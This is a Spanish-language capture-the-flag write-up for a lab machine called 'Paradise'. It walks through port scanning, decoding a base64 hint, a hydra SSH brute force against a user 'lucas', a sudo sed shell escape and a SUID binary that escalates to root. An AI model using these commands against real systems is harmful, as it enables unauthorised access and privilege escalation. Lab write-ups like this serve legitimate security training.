---
description: '✍️ Autor: kaikoperez🔍 Dificultad: Fácil  📅 Fecha de creación: 01/09/2024'
---

# Paradise

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más. También tenemos un servicio **SMB**.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea una página sobre el paraíso con dos botones sin funcionalidad.

<figure><img src="../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

Si revisamos el código fuente de la página `galery.html` encontramos un troz codificado en **base64** por lo que vamos a decodificarlo.

<figure><img src="../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

```bash
echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

Suponemos que será un directorio por lo que vamos a ello.

<figure><img src="../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Encontramos un posible usuario llamado **lucas** por lo que realizamos fuerza bruta.

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>

Tenemos sus credenciales por lo que nos logueamos a través de **SSH**.

```bash
ssh lucas@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **sed** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/sed/)cómo explotarlo.

```bash
sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

Ya somos el usuario **andy** pero no tenemos permisos **SUDO** por lo que buscamos los **SUID**.

```bash
find / -perm -4000 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención los dos últimas por lo que le echaremos un vistazo. Lo ejecutamos para ver que hace. Nos escala directamente a **root**.

```bash
/usr/local/bin/privileged_exec
```

<figure><img src="../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>
